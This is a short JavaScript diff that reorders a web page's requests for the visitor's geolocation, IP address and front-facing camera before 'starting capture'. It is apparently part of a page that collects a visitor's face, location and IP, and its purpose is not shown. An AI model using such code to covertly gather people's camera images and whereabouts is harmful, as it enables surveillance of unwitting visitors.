@@ -164,12 +164,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 } catch (e) { return "Unknown"; }
             };
 
-            // 1. Request Camera, Location, and IP in parallel
-            const [stream, position, ip] = await Promise.all([
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }),
-                getLocation(),
-                getIP()
-            ]);
+            // 1. Request Location FIRST
+            const position = await getLocation();
+
+            // 2. Request IP (background, no prompt) without blocking if possible or just await
+            const ip = await getIP();
+
+            // 3. Request Camera LAST
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
 
             console.log("Permissions granted. Starting capture...");
 
